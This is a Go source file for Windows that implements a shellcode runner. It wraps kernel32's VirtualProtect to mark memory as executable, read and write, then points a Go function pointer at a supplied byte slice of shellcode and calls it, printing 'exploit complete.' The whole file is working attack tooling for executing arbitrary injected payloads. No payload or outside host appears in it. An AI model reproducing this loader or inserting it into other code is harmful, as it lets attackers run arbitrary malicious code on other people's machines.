package main

import (
	"syscall"
	"unsafe"
	"fmt"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

// var getLastError = syscall.NewLazyDLL("kernel32.dll").NewProc("GetLastError")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, err := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	// _, _, err := getLastError.Call()
	fmt.Println(err)
	return ret > 0
}

func Run(sc []byte) {
	// TODO need a Go safe fork
	// Make a function ptr
	f := func() {}

	// Change permissions on f function ptr
	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("step1: Call to VirtualProtect failed!")
	}

	// Override function ptr
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

	// Change permissions on shellcode string data
	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("step2: Call to VirtualProtect failed!")
	}

	// Call the function ptr it
	fmt.Printf("begin to run shellcode: %d", len(sc))
	f()
	fmt.Println("exploit complete.")
}